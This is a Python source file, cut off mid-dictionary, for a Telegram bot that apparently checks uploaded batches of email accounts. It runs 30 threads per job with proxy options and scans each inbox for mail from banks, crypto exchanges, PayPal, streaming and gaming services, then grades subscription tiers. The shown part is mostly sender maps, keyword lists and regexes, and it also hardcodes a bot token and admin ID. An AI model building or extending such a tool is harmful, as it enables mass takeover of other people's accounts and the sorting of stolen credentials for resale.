import asyncio
import os
import re
from dotenv import load_dotenv
load_dotenv("bot.env")
import json
import uuid
import time
import itertools
import urllib.parse
import base64
import logging
import functools
from datetime import datetime, date, timedelta
from pathlib import Path
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Callable, Any
from queue import Queue
import io
import threading

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.error import BadRequest

# ================= LOGGING SETUP =================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger(__name__)

# Suppress noisy library loggers
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================= CONFIGURATION =================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8331199468:AAFvWEwCNJdK7o_pm2KzJkSmJuh179zSnno")
ADMIN_IDS = [int(i) for i in os.getenv("ADMIN_IDS", "1720020794").split(",") if i.strip()]
MAX_CONCURRENT_JOBS = 5
THREADS_PER_JOB = 30
DASHBOARD_UPDATE_INTERVAL = 10
ACCOUNT_DELAY = 0.01
PROXY_LIST = []
PROXY_ROTATION = False
RESULT_BASE_DIR = "results"
USER_DATA_FILE = "users.json"

# ================= FILE SIZE LIMITS (bytes) =================
FILE_SIZE_LIMITS = {
    0: 5 * 1024 * 1024,
    1: 15 * 1024 * 1024,
    2: 30 * 1024 * 1024,
}

# ================= DAILY FILE UPLOAD LIMITS =================
DAILY_FILE_LIMITS = {
    0: 3,
    1: 9999,
    2: 9999,
}

# ================= KEYWORD INBOX HELPERS =================
def ensure_keywords_file():
    path = "keywords.txt"
    if not os.path.exists(path):
        default = (
            "Steam\nNetflix\nPayPal\nAmazon\nBank\nInvoice\nReceipt\n"
            "Verification\nPassword Reset\nSecurity Alert\nInstagram\n"
            "Facebook\nReddit\nTikTok\nTwitter\nYouTube\nGoogle\nApple\n"
            "Microsoft\nEpic Games\nUbisoft\nRockstar Games\nElectronic Arts\n"
            "PlayStation\nXbox\nDiscord\nTelegram\nWhatsApp\nLinkedIn\n"
            "Snapchat\nSpotify\nHulu\nDisney+\nHBO Max\nParamount+\n"
            "Twitch\nUber\nDoorDash\nAirbnb\nBooking.com\nCoinbase\nBinance\n"
            "Wise\nPayoneer\nKraken\nBybit\nKuCoin\nCrypto\nMetaMask\n"
            "Nintendo\nRoblox\nMinecraft\nValorант\nFortnite\nPUBG\n"
            "Crunchyroll\nPlex\nDeezer\nTidal\nSoundCloud\nApple Music\n"
            "OneDrive\niCloud\nDropbox\nMEGA\nCanva\nAdobe\nSlack\nZoom\n"
            "NordVPN\nExpressVPN\nGitHub\nUdemy\nCoursera\nDuolingo\n"
            "AliExpress\nShein\nTemu\neBay\nEtsy\nNike\nAdidas\n"
            "OnlyFans\nPatreon\nKick\nQuora\nPinterest\nMedium\nFigma\n"
            "Blockchain\nLedger\nStripe\nSkrill\nCash App\nVenmo\nZelle\n"
            "Chase\nWells Fargo\nBank of America\nCiti\nBarclays\nHSBC\n"
            "Revolut\nN26\nMonzo\nChime\nRobinhood\nEtoro\nSchwab\n"
            "PlayStation Store\nXbox Store\nSteam Purchase\nGame Pass\n"
            "Order Confirmation\nShipping Confirmation\nDelivery\nTracking\n"
            "Subscription\nRenewal\nBilling\nCharged\nRefund\nDispute\n"
            "Account Locked\nSuspicious Login\n2-Step\nTwo-Factor\nMFA\n"
        )
        with open(path, "w", encoding="utf-8") as f:
            f.write(default)
    return path

def load_keywords_from_file():
    path = ensure_keywords_file()
    try:
        with open(path, "r", encoding="utf-8") as f:
            keywords = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        return keywords if keywords else ["Steam", "Netflix", "PayPal", "Amazon", "Bank"]
    except Exception:
        return ["Steam", "Netflix", "PayPal"]

INBOX_KEYWORDS = load_keywords_from_file()


# ================= RETRY UTILITY =================
def with_retry(func: Callable, max_attempts: int = 3, delay: float = 1.0,
               exceptions=(requests.exceptions.RequestException,)) -> Any:
    """Call func with automatic retries on specified exceptions."""
    last_exc = None
    for attempt in range(max_attempts):
        try:
            return func()
        except exceptions as e:
            last_exc = e
            if attempt < max_attempts - 1:
                time.sleep(delay * (attempt + 1))
    raise last_exc


# ================= SENDER EMAIL -> PLATFORM NAME MAPPING =================
SENDER_MAP = {
    # ── Gaming ────────────────────────────────────────────────────────────────
    "noreply@epicgames.com": "Epic Games",
    "help@epicgames.com": "Epic Games",
    "no-reply@epicgames.com": "Epic Games",
    "noreply@accounts.riotgames.com": "Riot Games",
    "no-reply@riotgames.com": "Riot Games",
    "support@riotgames.com": "Riot Games",
    "no-reply@steampowered.com": "Steam",
    "noreply@steampowered.com": "Steam",
    "contact@steampowered.com": "Steam",
    "noreply@playstation.com": "PlayStation",
    "noreply@email.playstation.com": "PlayStation",
    "no-reply@playstation.com": "PlayStation",
    "psn@playstation.com": "PlayStation",
    "sony@txn-email.playstation.com": "PlayStation",
    "sony@email02.account.sony.com": "PlayStation",
    "no-reply@sony.com": "PlayStation",
    "service@sony.com": "PlayStation",
    "noreply@xbox.com": "Xbox",
    "no-reply@xbox.com": "Xbox",
    "xbox@microsoft.com": "Xbox",
    "noreply@id.supercell.com": "Supercell",
    "support@supercell.com": "Supercell",
    "accounts@roblox.com": "Roblox",
    "noreply@roblox.com": "Roblox",
    "no-reply@roblox.com": "Roblox",
    "noreply@news.ubisoft.com": "Ubisoft",
    "noreply@ubisoft.com": "Ubisoft",
    "no-reply@ubisoft.com": "Ubisoft",
    "no-reply@accounts.ea.com": "EA",
    "no-reply@ea.com": "EA",
    "noreply@ea.com": "EA",
    "noreply@battle.net": "Battle.net",
    "no-reply@battle.net": "Battle.net",
    "noreply@blizzard.com": "Battle.net",
    "no-reply@blizzard.com": "Battle.net",
    "noreply@nintendo.com": "Nintendo",
    "no-reply@nintendo.com": "Nintendo",
    "noreply@rockstargames.com": "Rockstar",
    "noreply@minecraft.net": "Minecraft",
    "noreply@mojang.com": "Minecraft",
    "noreply@pubg.com": "PUBG",
    "noreply@pubgmobile.com": "PUBG Mobile",
    "noreply@valorant.com": "Valorant",
    "noreply@leagueoflegends.com": "League of Legends",
    "noreply@fortnite.com": "Fortnite",
    "noreply@konami.com": "Konami",
    "no-reply@konami.com": "Konami",
    "support@konami.com": "Konami",
    # ── Streaming ─────────────────────────────────────────────────────────────
    "no-reply@netflix.com": "Netflix",
    "info@mailer.netflix.com": "Netflix",
    "noreply@mailer.netflix.com": "Netflix",
    "account@netflix.com": "Netflix",
    "noreply@netflix.com": "Netflix",
    "noreply@crunchyroll.com": "Crunchyroll",
    "no-reply@crunchyroll.com": "Crunchyroll",
    "support@crunchyroll.com": "Crunchyroll",
    "noreply@disneyplus.com": "Disney+",
    "no-reply@disneyplus.com": "Disney+",
    "disneyplus@disneyplus.com": "Disney+",
    "noreply@primevideo.com": "Amazon Prime Video",
    "no-reply@primevideo.com": "Amazon Prime Video",
    "primevideo@amazon.com": "Amazon Prime Video",
    "noreply@hbomax.com": "HBO Max",
    "no-reply@hbomax.com": "HBO Max",
    "noreply@max.com": "HBO Max",
    "no-reply@max.com": "HBO Max",
    "noreply@appletv.apple.com": "Apple TV+",
    "no-reply@appletv.apple.com": "Apple TV+",
    "no-reply@hulu.com": "Hulu",
    "no-reply@paramountplus.com": "Paramount+",
    "noreply@plex.tv": "Plex",
    "no-reply@youtube.com": "YouTube",
    # ── Music ─────────────────────────────────────────────────────────────────
    "noreply@accounts.spotify.com": "Spotify",
    "no-reply@spotify.com": "Spotify",
    "noreply@spotify.com": "Spotify",
    "noreply@music.apple.com": "Apple Music",
    "no-reply@music.apple.com": "Apple Music",
    "noreply@deezer.com": "Deezer",
    "no-reply@deezer.com": "Deezer",
    "noreply@soundcloud.com": "SoundCloud",
    "no-reply@soundcloud.com": "SoundCloud",
    "noreply@tidal.com": "Tidal",
    "noreply@music.youtube.com": "YouTube Music",
    "no-reply@youtubemusic.com": "YouTube Music",
    # ── Finance ───────────────────────────────────────────────────────────────
    "no-reply@paypal.com": "PayPal",
    "noreply@paypal.com": "PayPal",
    "service@paypal.com": "PayPal",
    "no-reply@info.coinbase.com": "Coinbase",
    "noreply@coinbase.com": "Coinbase",
    "no-reply@coinbase.com": "Coinbase",
    "no-reply@binance.com": "Binance",
    "noreply@binance.com": "Binance",
    "support@binance.com": "Binance",
    "no-reply@wise.com": "Wise",
    "noreply@wise.com": "Wise",
    "transfers@wise.com": "Wise",
    "noreply@payoneer.com": "Payoneer",
    "no-reply@payoneer.com": "Payoneer",
    "support@payoneer.com": "Payoneer",
    "noreply@skrill.com": "Skrill",
    "no-reply@skrill.com": "Skrill",
    "noreply@stripe.com": "Stripe",
    "no-reply@stripe.com": "Stripe",
    "support@stripe.com": "Stripe",
    "noreply@kraken.com": "Kraken",
    "noreply@kucoin.com": "KuCoin",
    "noreply@bybit.com": "Bybit",
    "noreply@crypto.com": "Crypto.com",
    "noreply@metamask.io": "MetaMask",
    "no-reply@ledger.com": "Ledger",
    "no-reply@blockchain.com": "Blockchain",
    # ── E-commerce ────────────────────────────────────────────────────────────
    "noreply@amazon.com": "Amazon",
    "no-reply@amazon.com": "Amazon",
    "shipment-tracking@amazon.com": "Amazon",
    "confirmation@amazon.co.jp": "Amazon JP",
    "shipment-tracking@amazon.co.jp": "Amazon JP",
    "auto-confirm@amazon.co.uk": "Amazon UK",
    "shipment-tracking@amazon.co.uk": "Amazon UK",
    "noreply@ebay.com": "eBay",
    "no-reply@ebay.com": "eBay",
    "noreply@aliexpress.com": "AliExpress",
    "no-reply@aliexpress.com": "AliExpress",
    "support@aliexpress.com": "AliExpress",
    "noreply@shein.com": "Shein",
    "no-reply@shein.com": "Shein",
    "newsletter@shein.com": "Shein",
    "noreply@temu.com": "Temu",
    "no-reply@temu.com": "Temu",
    "noreply@etsy.com": "Etsy",
    "no-reply@etsy.com": "Etsy",
    "transaction@etsy.com": "Etsy",
    "noreply@nike.com": "Nike",
    # ── Social Media ──────────────────────────────────────────────────────────
    "noreply@facebook.com": "Facebook",
    "notification@facebookmail.com": "Facebook",
    "noreply@facebookmail.com": "Facebook",
    "security@facebookmail.com": "Facebook",
    "update@facebookmail.com": "Facebook",
    "noreply@instagram.com": "Instagram",
    "noreply@mail.instagram.com": "Instagram",
    "security@mail.instagram.com": "Instagram",
    "no-reply@mail.instagram.com": "Instagram",
    "noreply@tiktok.com": "TikTok",
    "no-reply@tiktok.com": "TikTok",
    "noreply@tiktokmail.com": "TikTok",
    "no-reply@tiktokmail.com": "TikTok",
    "noreply@twitter.com": "Twitter (X)",
    "no-reply@twitter.com": "Twitter (X)",
    "noreply@x.com": "Twitter (X)",
    "no-reply@x.com": "Twitter (X)",
    "info@twitter.com": "Twitter (X)",
    "noreply@snapchat.com": "Snapchat",
    "no-reply@snapchat.com": "Snapchat",
    "support@snapchat.com": "Snapchat",
    "noreply@linkedin.com": "LinkedIn",
    "no-reply@linkedin.com": "LinkedIn",
    "messages-noreply@linkedin.com": "LinkedIn",
    "noreply@pinterest.com": "Pinterest",
    "no-reply@pinterest.com": "Pinterest",
    # ── Tech / Cloud ──────────────────────────────────────────────────────────
    "noreply@accounts.google.com": "Google",
    "no-reply@accounts.google.com": "Google",
    "noreply@google.com": "Google",
    "noreply@microsoft.com": "Microsoft",
    "no-reply@microsoft.com": "Microsoft",
    "noreply@dropbox.com": "Dropbox",
    "no-reply@dropbox.com": "Dropbox",
    "noreply@onedrive.com": "OneDrive",
    "noreply@icloud.com": "iCloud",
    "no-reply@icloud.com": "iCloud",
    "do-not-reply@yahoo.com": "Yahoo",
    "noreply@yahoo.com": "Yahoo",
    "noreply@yahoomail.com": "Yahoo",
    "noreply@mega.nz": "MEGA",
    "noreply@canva.com": "Canva",
    "noreply@adobe.com": "Adobe",
    "noreply@slack.com": "Slack",
    "noreply@zoom.us": "Zoom",
    "no-reply@zoom.us": "Zoom",
    "no-reply@nordvpn.com": "NordVPN",
    "no-reply@nordaccount.com": "NordVPN",
    "noreply@expressvpn.com": "ExpressVPN",
    # ── Education / Dev ───────────────────────────────────────────────────────
    "noreply@udemy.com": "Udemy",
    "no-reply@udemy.com": "Udemy",
    "noreply@coursera.org": "Coursera",
    "no-reply@coursera.org": "Coursera",
    "accounts@coursera.org": "Coursera",
    "noreply@edx.org": "edX",
    "no-reply@edx.org": "edX",
    "noreply@skillshare.com": "Skillshare",
    "no-reply@skillshare.com": "Skillshare",
    "noreply@github.com": "GitHub",
    "no-reply@github.com": "GitHub",
    "noreply@stackoverflow.com": "Stack Overflow",
    "noreply@gitlab.com": "GitLab",
    "noreply@duolingo.com": "Duolingo",
    "noreply@medium.com": "Medium",
    "noreply@figma.com": "Figma",
    # ── Travel / Services ─────────────────────────────────────────────────────
    "noreply@uber.com": "Uber",
    "no-reply@uber.com": "Uber",
    "uber@uber.com": "Uber",
    "receipts@uber.com": "Uber",
    "uber@t.uber.com": "Uber",
    "noreply=uber.com@mgt.uber.com": "Uber",
    "noreply@airbnb.com": "Airbnb",
    "no-reply@airbnb.com": "Airbnb",
    "automated@airbnb.com": "Airbnb",
    "noreply@booking.com": "Booking.com",
    "no-reply@booking.com": "Booking.com",
    "noreply@bstatic.com": "Booking.com",
    "noreply@tripadvisor.com": "Tripadvisor",
    "no-reply@tripadvisor.com": "Tripadvisor",
    "memberservices@tripadvisor.com": "Tripadvisor",
    # ── Communication ─────────────────────────────────────────────────────────
    "noreply@telegram.org": "Telegram",
    "no-reply@telegram.org": "Telegram",
    "noreply@whatsapp.com": "WhatsApp",
    "no-reply@whatsapp.com": "WhatsApp",
    "security@whatsapp.com": "WhatsApp",
    "no-reply@discord.com": "Discord",
    "noreply@discord.com": "Discord",
    "noreply@skype.com": "Skype",
    "no-reply@skype.com": "Skype",
    "noreply@apple.com": "Apple",
    # ── Misc / Entertainment ──────────────────────────────────────────────────
    "noreply@reddit.com": "Reddit",
    "no-reply@reddit.com": "Reddit",
    "noreply@twitch.tv": "Twitch",
    "no-reply@twitch.tv": "Twitch",
    "noreply@kick.com": "Kick",
    "no-reply@kick.com": "Kick",
    "noreply@patreon.com": "Patreon",
    "no-reply@patreon.com": "Patreon",
    "noreply@quora.com": "Quora",
    "no-reply@quora.com": "Quora",
    "noreply@googledrive.com": "Google Drive",
    "noreply@onlyfans.com": "OnlyFans",
    "no-reply@onlyfans.com": "OnlyFans",
    "support@onlyfans.com": "OnlyFans",
    "noreply@email.onlyfans.com": "OnlyFans",
}

SENDER_PATTERNS = list(SENDER_MAP.keys())

# ================= SUBJECT KEYWORD -> PLATFORM MAPPING =================
# Used as fallback when sender domain is not recognized
SUBJECT_PLATFORM_KEYWORDS: list[tuple[str, list[str]]] = [
    # Gaming
    ("Epic Games",           ["epic games", "epicgames", "fortnite", "unreal"]),
    ("Riot Games",           ["riot games", "valorant", "league of legends", "wild rift", "teamfight tactics"]),
    ("Steam",                ["steam", "steampowered"]),
    ("PlayStation",          ["playstation", "psn", "sony", "ps plus", "ps4", "ps5"]),
    ("Xbox",                 ["xbox", "game pass", "gamepass", "xbox live", "xbox game"]),
    ("Supercell",            ["supercell", "clash of clans", "clash royale", "brawl stars"]),
    ("Roblox",               ["roblox", "robux"]),
    ("Ubisoft",              ["ubisoft", "uplay", "ubisoft connect"]),
    ("EA",                   ["ea games", "ea sports", "electronic arts", "ea play", "origin"]),
    ("Battle.net",           ["battle.net", "blizzard", "world of warcraft", "overwatch", "hearthstone", "diablo"]),
    ("Nintendo",             ["nintendo", "switch online", "nintendo eshop"]),
    ("Rockstar",             ["rockstar", "gta", "grand theft auto", "red dead"]),
    ("Minecraft",            ["minecraft", "mojang"]),
    ("PUBG",                 ["pubg", "playerunknown"]),
    ("Twitch",               ["twitch"]),
    ("Discord",              ["discord"]),
    ("Kick",                 ["kick.com", "kick stream"]),
    # Streaming
    ("Netflix",              ["netflix"]),
    ("Crunchyroll",          ["crunchyroll"]),
    ("Disney+",              ["disney+", "disney plus", "disneyplus"]),
    ("Amazon Prime Video",   ["prime video", "amazon prime video", "primevideo"]),
    ("HBO Max",              ["hbo", "max streaming", "hbomax"]),
    ("Apple TV+",            ["apple tv", "apple tv+"]),
    ("Hulu",                 ["hulu"]),
    ("Paramount+",           ["paramount+", "paramount plus"]),
    ("Plex",                 ["plex"]),
    ("YouTube",              ["youtube"]),
    # Music
    ("Spotify",              ["spotify"]),
    ("Apple Music",          ["apple music"]),
    ("Deezer",               ["deezer"]),
    ("SoundCloud",           ["soundcloud"]),
    ("Tidal",                ["tidal"]),
    ("YouTube Music",        ["youtube music"]),
    # Finance
    ("PayPal",               ["paypal"]),
    ("Coinbase",             ["coinbase"]),
    ("Binance",              ["binance"]),
    ("Wise",                 ["wise transfer", "transferwise", "wise.com"]),
    ("Payoneer",             ["payoneer"]),
    ("Skrill",               ["skrill"]),
    ("Stripe",               ["stripe"]),
    ("Kraken",               ["kraken"]),
    ("KuCoin",               ["kucoin"]),
    ("Bybit",                ["bybit"]),
    ("Crypto.com",           ["crypto.com"]),
    ("MetaMask",             ["metamask"]),
    # E-commerce
    ("Amazon",               ["amazon", "your amazon order", "amazon order", "shipped by amazon"]),
    ("eBay",                 ["ebay"]),
    ("AliExpress",           ["aliexpress"]),
    ("Shein",                ["shein"]),
    ("Temu",                 ["temu"]),
    ("Etsy",                 ["etsy"]),
    ("Nike",                 ["nike"]),
    # Social
    ("Facebook",             ["facebook", "meta", "from facebook"]),
    ("Instagram",            ["instagram"]),
    ("TikTok",               ["tiktok"]),
    ("Twitter (X)",          ["twitter", "x.com", "from x"]),
    ("Snapchat",             ["snapchat"]),
    ("LinkedIn",             ["linkedin"]),
    ("Pinterest",            ["pinterest"]),
    ("Reddit",               ["reddit"]),
    ("Quora",                ["quora"]),
    ("OnlyFans",             ["onlyfans"]),
    # Tech / Cloud
    ("Google",               ["google account", "google play", "google one", "from google"]),
    ("Dropbox",              ["dropbox"]),
    ("OneDrive",             ["onedrive"]),
    ("iCloud",               ["icloud"]),
    ("Apple",                ["apple id", "apple account", "from apple"]),
    ("Yahoo",                ["yahoo"]),
    ("MEGA",                 ["mega.nz", "mega cloud"]),
    ("Canva",                ["canva"]),
    ("Adobe",                ["adobe"]),
    ("Slack",                ["slack"]),
    ("Zoom",                 ["zoom meeting", "zoom webinar"]),
    ("NordVPN",              ["nordvpn", "nord account"]),
    ("ExpressVPN",           ["expressvpn"]),
    # Education / Dev
    ("Udemy",                ["udemy"]),
    ("Coursera",             ["coursera"]),
    ("edX",                  ["edx"]),
    ("Skillshare",           ["skillshare"]),
    ("GitHub",               ["github"]),
    ("GitLab",               ["gitlab"]),
    ("Duolingo",             ["duolingo"]),
    ("Medium",               ["medium"]),
    ("Figma",                ["figma"]),
    # Travel
    ("Uber",                 ["uber", "your trip", "uber eats"]),
    ("Airbnb",               ["airbnb"]),
    ("Booking.com",          ["booking.com"]),
    ("Tripadvisor",          ["tripadvisor"]),
    # Telecom / Other
    ("Telegram",             ["telegram"]),
    ("WhatsApp",             ["whatsapp"]),
    ("Skype",                ["skype"]),
    ("Patreon",              ["patreon"]),
]


def resolve_by_subject(subject: str) -> str:
    """Return a platform name if the subject contains a recognizable keyword."""
    if not subject:
        return ""
    s = subject.lower()
    for platform, keywords in SUBJECT_PLATFORM_KEYWORDS:
        for kw in keywords:
            if kw in s:
                return platform
    return ""


# ================= PREMIUM PLATFORM DETECTION =================
PREMIUM_PLATFORMS = {
    "Netflix", "Crunchyroll", "Disney+", "Amazon Prime Video", "HBO Max", "Apple TV+",
    "Spotify", "Apple Music", "Deezer", "YouTube Music", "Tidal",
    "PlayStation", "Xbox", "EA", "Twitch",
    "TikTok", "Facebook", "Instagram", "LinkedIn",
    "Discord", "Reddit", "Patreon", "Kick",
    "GitHub", "Udemy", "Coursera", "Binance",
    "OnlyFans", "Konami",
}

PLATFORM_EMOJIS = {
    # Gaming
    "Epic Games": "🎮", "Riot Games": "⚔️", "Steam": "🎮",
    "PlayStation": "🎮", "Xbox": "🎮", "Supercell": "🏆",
    "Roblox": "🧱", "Ubisoft": "🗡️", "EA": "⚽",
    "Battle.net": "🔵", "Nintendo": "🔴", "Rockstar": "⭐",
    "Minecraft": "⛏️", "PUBG": "🎯", "Valorant": "🔫",
    "League of Legends": "⚔️", "Fortnite": "🎯", "Konami": "🎮",
    # Streaming
    "Netflix": "🎬", "Crunchyroll": "🌸", "Disney+": "🏰",
    "Amazon Prime Video": "📺", "Amazon Prime": "📺",
    "HBO Max": "👑", "Apple TV+": "🍎", "Hulu": "📺",
    "Paramount+": "⛰️", "Plex": "📺", "YouTube": "▶️",
    # Music
    "Spotify": "🎧", "Apple Music": "🎵", "Deezer": "🎵",
    "SoundCloud": "🔶", "Tidal": "🌊", "YouTube Music": "🎵",
    # Finance
    "PayPal": "💳", "Coinbase": "₿", "Binance": "🟡",
    "Wise": "💚", "Payoneer": "🔴", "Skrill": "💜",
    "Stripe": "💙", "Kraken": "🐙", "KuCoin": "🟢",
    "Bybit": "🔷", "Crypto.com": "💎", "MetaMask": "🦊",
    "Ledger": "🔐", "Blockchain": "⛓️",
    # E-commerce
    "Amazon": "📦", "eBay": "🛒", "AliExpress": "🛍️",
    "Shein": "👗", "Temu": "🛒", "Etsy": "🎨", "Nike": "👟",
    # Social Media
    "Facebook": "📘", "Instagram": "📷", "TikTok": "🎵",
    "Twitter (X)": "🐦", "Snapchat": "👻", "LinkedIn": "💼",
    "Pinterest": "📌",
    # Tech / Cloud
    "Google": "🔍", "Microsoft": "🪟", "Dropbox": "📦",
    "OneDrive": "☁️", "iCloud": "☁️", "Yahoo": "💜",
    "Apple": "🍎", "MEGA": "☁️", "Canva": "🎨",
    "Adobe": "🖌️", "Slack": "💬", "NordVPN": "🛡️",
    "ExpressVPN": "🛡️",
    # Education / Dev
    "Udemy": "📚", "Coursera": "🎓", "edX": "🎓",
    "Skillshare": "✏️", "GitHub": "🐙", "GitLab": "🦊",
    "Stack Overflow": "📚", "Duolingo": "🦜", "Medium": "✍️",
    "Figma": "🎨",
    # Travel / Services
    "Uber": "🚗", "Airbnb": "🏠", "Booking.com": "🏨",
    "Tripadvisor": "✈️",
    # Communication
    "Telegram": "✈️", "WhatsApp": "💬", "Discord": "💬",
    "Zoom": "📹", "Skype": "🔵",
    # Misc
    "Reddit": "🟠", "Twitch": "💜", "Kick": "🟢",
    "Patreon": "🎭", "Quora": "❓",
    "OnlyFans": "🔞",
}

SUBSCRIPTION_PATTERNS = {
    "Netflix": [
        (re.compile(r'premium', re.I), "Premium 4K"),
        (re.compile(r'standard with ads', re.I), "Standard w/Ads"),
        (re.compile(r'standard', re.I), "Standard"),
        (re.compile(r'basic', re.I), "Basic"),
        (re.compile(r'member', re.I), "Member"),
    ],
    "PlayStation": [
        (re.compile(r'ps plus premium|playstation plus premium', re.I), "PS Plus Premium"),
        (re.compile(r'ps plus extra|playstation plus extra', re.I), "PS Plus Extra"),
        (re.compile(r'ps plus essential|playstation plus essential', re.I), "PS Plus Essential"),
        (re.compile(r'ps plus|playstation plus', re.I), "PS Plus"),
        (re.compile(r'ps now|playstation now', re.I), "PS Now"),
        (re.compile(r'ea play', re.I), "EA Play"),
    ],
    "Crunchyroll": [
        (re.compile(r'ultimate fan', re.I), "Ultimate Fan"),
        (re.compile(r'mega fan', re.I), "Mega Fan"),
        (re.compile(r'fan plan|fan\b', re.I), "Fan"),
        (re.compile(r'premium', re.I), "Premium"),
        (re.compile(r'subscri', re.I), "Subscriber"),
    ],
    "TikTok": [
        (re.compile(r'tiktok live|live subscription', re.I), "LIVE Creator"),
        (re.compile(r'creator marketplace', re.I), "Creator Marketplace"),
        (re.compile(r'tiktok shop', re.I), "TikTok Shop"),
        (re.compile(r'creator', re.I), "Creator"),
    ],
    "Facebook": [
        (re.compile(r'meta verified|verified badge', re.I), "Meta Verified ✓"),
        (re.compile(r'ads manager|advertising', re.I), "Ads Account"),
        (re.compile(r'business suite|business manager', re.I), "Business"),
        (re.compile(r'marketplace', re.I), "Marketplace"),
    ],
    "Instagram": [
        (re.compile(r'meta verified|verified badge', re.I), "Meta Verified ✓"),
        (re.compile(r'creator', re.I), "Creator"),
        (re.compile(r'subscri', re.I), "Subscriber"),
        (re.compile(r'shop', re.I), "Instagram Shop"),
    ],
    "Spotify": [
        (re.compile(r'premium duo', re.I), "Premium Duo"),
        (re.compile(r'premium family', re.I), "Premium Family"),
        (re.compile(r'premium student', re.I), "Premium Student"),
        (re.compile(r'premium', re.I), "Premium"),
        (re.compile(r'free', re.I), "Free"),
    ],
    "Disney+": [
        (re.compile(r'premium|4k|no ads', re.I), "Premium"),
        (re.compile(r'basic|with ads', re.I), "Basic w/Ads"),
        (re.compile(r'bundle', re.I), "Bundle"),
        (re.compile(r'subscri|member', re.I), "Subscriber"),
    ],
    "Amazon Prime Video": [
        (re.compile(r'prime video channels', re.I), "Prime Channels"),
        (re.compile(r'prime video', re.I), "Prime Video"),
        (re.compile(r'prime', re.I), "Prime"),
    ],
    "HBO Max": [
        (re.compile(r'ultimate|ad.free|no ads', re.I), "Ultimate Ad-Free"),
        (re.compile(r'with ads', re.I), "With Ads"),
        (re.compile(r'subscri|member', re.I), "Subscriber"),
    ],
    "Apple TV+": [
        (re.compile(r'apple one', re.I), "Apple One"),
        (re.compile(r'subscri|member', re.I), "Subscriber"),
    ],
    "Apple Music": [
        (re.compile(r'family', re.I), "Family"),
        (re.compile(r'student', re.I), "Student"),
        (re.compile(r'individual|subscri', re.I), "Individual"),
    ],
    "Twitch": [
        (re.compile(r'turbo', re.I), "Turbo"),
        (re.compile(r'tier 3', re.I), "Tier 3"),
        (re.compile(r'tier 2', re.I), "Tier 2"),
        (re.compile(r'tier 1|subscri', re.I), "Tier 1"),
    ],
    "YouTube Music": [
        (re.compile(r'family', re.I), "Family"),
        (re.compile(r'student', re.I), "Student"),
        (re.compile(r'premium', re.I), "Premium"),
    ],
    "LinkedIn": [
        (re.compile(r'premium career', re.I), "Premium Career"),
        (re.compile(r'premium business', re.I), "Premium Business"),
        (re.compile(r'sales navigator', re.I), "Sales Navigator"),
        (re.compile(r'recruiter', re.I), "Recruiter"),
        (re.compile(r'premium', re.I), "Premium"),
    ],
    "Patreon": [
        (re.compile(r'patron|subscri|member', re.I), "Patron"),
    ],
    "GitHub": [
        (re.compile(r'enterprise', re.I), "Enterprise"),
        (re.compile(r'team', re.I), "Team"),
        (re.compile(r'pro', re.I), "Pro"),
    ],
    "Udemy": [
        (re.compile(r'personal plan|subscri', re.I), "Personal Plan"),
        (re.compile(r'business', re.I), "Business"),
    ],
    "Coursera": [
        (re.compile(r'coursera plus', re.I), "Coursera Plus"),
        (re.compile(r'professional certificate', re.I), "Professional Cert"),
        (re.compile(r'subscri|enroll', re.I), "Enrolled"),
    ],
    "Discord": [
        (re.compile(r'nitro basic', re.I), "Nitro Basic"),
        (re.compile(r'nitro', re.I), "Nitro"),
        (re.compile(r'server boost|boost', re.I), "Server Boost"),
    ],
    "Reddit": [
        (re.compile(r'premium', re.I), "Reddit Premium"),
    ],
    "Kick": [
        (re.compile(r'subscri|member', re.I), "Subscriber"),
    ],
    "Deezer": [
        (re.compile(r'family', re.I), "Family"),
        (re.compile(r'student', re.I), "Student"),
        (re.compile(r'premium|hi.fi', re.I), "Premium"),
    ],
    "Binance": [
        (re.compile(r'vip', re.I), "VIP"),
        (re.compile(r'subscri|member', re.I), "Member"),
    ],
}


COUNTRY_FLAGS = {
    "United States": "🇺🇸", "United Kingdom": "🇬🇧", "Canada": "🇨🇦",
    "Australia": "🇦🇺", "New Zealand": "🇳🇿", "Ireland": "🇮🇪",
    "Germany": "🇩🇪", "France": "🇫🇷", "Spain": "🇪🇸", "Italy": "🇮🇹",
    "Netherlands": "🇳🇱", "Belgium": "🇧🇪", "Switzerland": "🇨🇭",
    "Austria": "🇦🇹", "Portugal": "🇵🇹", "Sweden": "🇸🇪", "Norway": "🇳🇴",
    "Denmark": "🇩🇰", "Finland": "🇫🇮", "Poland": "🇵🇱", "Czech Republic": "🇨🇿",
    "Romania": "🇷🇴", "Hungary": "🇭🇺", "Greece": "🇬🇷", "Ukraine": "🇺🇦",
    "Russia": "🇷🇺", "Turkey": "🇹🇷", "Israel": "🇮🇱",
    "Saudi Arabia": "🇸🇦", "UAE": "🇦🇪", "Egypt": "🇪🇬",
    "India": "🇮🇳", "China": "🇨🇳", "Japan": "🇯🇵", "South Korea": "🇰🇷",
    "Taiwan": "🇹🇼", "Thailand": "🇹🇭", "Indonesia": "🇮🇩", "Malaysia": "🇲🇾",
    "Vietnam": "🇻🇳", "Philippines": "🇵🇭", "Iran": "🇮🇷",
    "Brazil": "🇧🇷", "Mexico": "🇲🇽", "Argentina": "🇦🇷", "Colombia": "🇨🇴",
    "Chile": "🇨🇱", "Peru": "🇵🇪",
}


TLD_COUNTRY_MAP = {
    ".es": "Spain", ".fr": "France", ".de": "Germany", ".it": "Italy",
    ".pt": "Portugal", ".nl": "Netherlands", ".be": "Belgium", ".ch": "Switzerland",
    ".at": "Austria", ".pl": "Poland", ".ru": "Russia", ".ua": "Ukraine",
    ".tr": "Turkey", ".ro": "Romania", ".cz": "Czech Republic", ".hu": "Hungary",
    ".gr": "Greece", ".se": "Sweden", ".no": "Norway", ".dk": "Denmark",
    ".fi": "Finland", ".br": "Brazil", ".mx": "Mexico", ".ar": "Argentina",
